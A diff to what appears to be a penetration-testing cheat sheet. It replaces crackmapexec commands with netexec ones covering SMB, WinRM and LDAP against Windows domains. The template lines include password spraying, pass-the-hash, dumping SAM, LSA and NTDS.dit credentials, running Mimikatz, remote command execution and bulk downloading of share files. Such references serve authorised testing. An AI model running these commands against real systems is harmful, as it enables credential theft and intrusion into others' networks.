@@ -217,24 +217,33 @@ binwalk -Y <file> # Scans for YARA rule matches (custom pattern signatures)
 
 # Penetration testing
 
-## crackmapexec
-crackmapexec smb <target> -u '' -p '' --users # Attempts an anonymous/null SMB login and enumerates domain/local users if allowed
-crackmapexec smb <target> # Performs a basic SMB scan, showing hostname, domain, OS, and signing status
-crackmapexec smb <target> -u <user> -p <password> # Validates a single set of credentials against the target
-crackmapexec smb <target> -u <user> -p <password> --local-auth # Authenticates using local (non-domain) account credentials
-crackmapexec smb <targets.txt> -u <userlist> -p <passwordlist> # Password sprays a list of credentials across multiple hosts
-crackmapexec smb <target> -u <user> -p <password> --shares # Lists accessible SMB shares for the given credentials
-crackmapexec smb <target> -u <user> -p <password> --groups # Enumerates domain/local groups
-crackmapexec smb <target> -u <user> -p <password> --loggedon-users # Lists users currently logged on to the target
-crackmapexec smb <target> -u <user> -p <password> --sam # Dumps the local SAM database (requires admin privileges)
-crackmapexec smb <target> -u <user> -p <password> --lsa # Dumps LSA secrets (requires admin privileges)
-crackmapexec smb <target> -u <user> -H <NTLM hash> # Authenticates using a pass-the-hash (NTLM hash instead of a password)
-crackmapexec smb <target> -u <user> -p <password> -x "whoami" # Executes a remote command via SMB (requires admin privileges)
-crackmapexec smb <target> -u <user> -p <password> -M mimikatz # Runs the Mimikatz module to extract creds/secrets from memory
-crackmapexec smb <target> -u <user> -p <password> --ntds # Dumps the NTDS.dit file (domain controller credential database)
-crackmapexec winrm <target> -u <user> -p <password> # Validates credentials over WinRM (useful when SMB is restricted)
-crackmapexec ldap <target> -u <user> -p <password> --users # Enumerates domain users via LDAP
-crackmapexec smb <target> -u <user> -p <password> --rid-brute # Brute-forces RIDs to enumerate users/groups even with restrictive policies
+netexec smb <target> # Performs a basic SMB scan, showing hostname, domain, OS, and signing status
+netexec smb <target> -u <user> -p <password> # Validates a single set of credentials against the target
+netexec smb <target> -u <user> -p <password> --local-auth # Authenticates using local (non-domain) account credentials
+netexec smb <targets.txt> -u <userlist> -p <passwordlist> # Password sprays a list of credentials across multiple hosts
+netexec smb <target> -u <user> -p <password> --shares # Lists accessible SMB shares for the given credentials
+netexec smb <target> -u <user> -p <password> --groups # Enumerates domain/local groups
+netexec smb <target> -u <user> -p <password> --loggedon-users # Lists users currently logged on to the target
+netexec smb <target> -u <user> -p <password> --sam # Dumps the local SAM database (requires admin privileges)
+netexec smb <target> -u <user> -p <password> --lsa # Dumps LSA secrets (requires admin privileges)
+netexec smb <target> -u <user> -H <NTLM hash> # Authenticates using a pass-the-hash (NTLM hash instead of a password)
+netexec smb <target> -u <user> -p <password> -x "whoami" # Executes a remote command via SMB (requires admin privileges)
+netexec smb <target> -u <user> -p <password> -M mimikatz # Runs the Mimikatz module to extract creds/secrets from memory
+netexec smb <target> -u <user> -p <password> --ntds # Dumps the NTDS.dit file (domain controller credential database)
+netexec winrm <target> -u <user> -p <password> # Validates credentials over WinRM (useful when SMB is restricted)
+netexec ldap <target> -u <user> -p <password> --users # Enumerates domain users via LDAP
+netexec smb <target> -u <user> -p <password> --rid-brute # Brute-forces RIDs to enumerate users/groups even with restrictive policies
+netexec smb <target> -u anonymous -p anonymous --shares # Attempts anonymous SMB login and lists accessible shares
+netexec smb <target> -u <user> -p <password> -M <module> # Runs a specific module against the target (e.g. mimikatz, spider_plus, lsassy)
+netexec smb <target> -L # Lists all available modules for the SMB protocol
+netexec smb <target> -M <module> --options # Shows configurable options for a given module
+netexec smb <target> -u <user> -p <password> --shares --groups --loggedon-users --sessions --users --rid-brute --pass-pol # Runs multiple enumeration checks in a single pass
+netexec smb <target> -u <user> -p <password> -x "whoami" --exec-method smbexec # Forces command execution via the smbexec method instead of the default wmiexec
+netexec smb <target> -u <user> -p <password> --local-auth -M mimikatz # Runs Mimikatz using local account authentication
+netexec smb <target> -u <user> -p <password> -M spider_plus -o DOWNLOAD_FLAG=true # Recursively spiders and downloads all accessible files across SMB shares
+netexec smb <target> -u <userlist> -p <passwordlist> --continue-on-success # Password sprays a credential list, continuing even after a successful login
+netexec winrm <target> -u <user> -p <password> -x "hostname" # Validates credentials and executes a command over WinRM
+netexec ldap <domain_controller> -u <user> -p <password> --bloodhound --collection All # Collects BloodHound-compatible Active Directory data via LDAP
 
 ## Metasploit
 ### Variable Reference
